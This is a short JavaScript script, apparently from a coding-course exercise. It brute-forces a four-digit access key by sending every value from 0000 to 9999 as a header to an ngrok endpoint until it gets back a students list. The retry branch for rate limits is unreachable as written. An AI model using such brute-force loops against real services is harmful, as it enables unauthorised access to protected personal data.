import axios from 'axios';

async function call(osama) {
  try {
    let res = await axios.get(
      'https://7758-2001-b07-a9a-89a8-fc69-90ae-c7c4-8dbc.ngrok-free.app/digitazon/2023/02/group/1/students',
      {
        method: 'get',
        headers: {
          key: osama,
        },
      }
    );
    console.log(res.data);
    return res.status;
  } catch (error) {
    console.log(error.response.status, 'catch', osama);
    return error.response.status;
  }
}

function nextKey(osama) {
  const x = 4 - ('' + osama).length;
  let key = '';
  for (let i = 0; i < x; i++) {
    key += '0';
  }
  return (key += osama);
}

// call('0166');

async function caller() {
  let i = 0;
  while (i < 10000 && i > -1) {
    let response = await call(nextKey(i));
    if (response >= 400) {
      i++;
    } else if (response >= 500 || response == 429) {
      i--;
    } else {
      console.log(response);
      break;
    }
  }
}

caller();
